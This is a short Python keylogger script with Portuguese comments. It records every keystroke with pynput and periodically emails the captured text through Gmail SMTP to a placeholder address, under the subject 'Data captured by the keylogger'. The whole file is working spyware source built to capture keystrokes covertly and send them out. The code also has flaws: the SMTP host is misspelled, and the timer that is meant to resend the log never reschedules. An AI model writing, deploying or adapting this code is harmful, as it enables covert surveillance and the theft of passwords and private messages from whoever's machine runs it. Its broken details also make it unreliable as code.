from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

#CONFIGURAÇÃO DE E-MAIL
EMAIL_ORIGEM = "exemplokeylogger@gmail.com"
EMAIL_DESTINO = "exemplokeylogger@gmail.com"
SENHA_EMAIL = "senha@email-exemplo"

log = ""

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smpt.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

        # Agendar o evnio a cada 60 segundos
        Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.backspace:
                log += "[<]"
            else:
                pass # Ignorar control, shift, etc...

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  
    listener.join()
